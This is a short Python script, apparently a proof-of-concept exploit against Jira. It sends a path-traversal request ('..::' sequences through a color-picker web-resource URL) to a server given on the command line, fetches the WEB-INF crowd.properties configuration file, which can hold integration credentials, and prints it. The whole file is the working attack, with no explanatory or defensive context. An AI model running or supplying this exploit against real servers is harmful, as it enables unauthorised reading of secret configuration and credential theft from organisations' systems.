import sys
import requests

base = sys.argv[1].rstrip('/')
path = '/download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::classes::crowd.properties'
response = requests.get(base + path, timeout=15)
response.raise_for_status()
print(response.text)
